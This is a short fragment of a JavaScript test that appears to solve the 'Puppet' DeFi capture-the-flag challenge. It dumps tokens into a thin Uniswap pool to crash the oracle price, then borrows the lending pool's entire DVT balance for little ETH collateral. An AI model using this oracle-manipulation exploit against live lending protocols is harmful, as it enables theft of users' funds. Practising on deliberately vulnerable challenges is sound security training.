...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        // Unbalance the low liquidity uniswap pair, get the eth to drop the DVT price
        // borrow all the DVT for little eth collateral
        ...
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ethers.utils.parseEther("900"), ethers.utils.parseEther("9.5"), deadline);
        
        let ethCollateralPerDVT = await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther("1"))
        let totalEthCollateral = ethCollateralPerDVT.mul(100000)

        await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther("100000"), {value: totalEthCollateral});
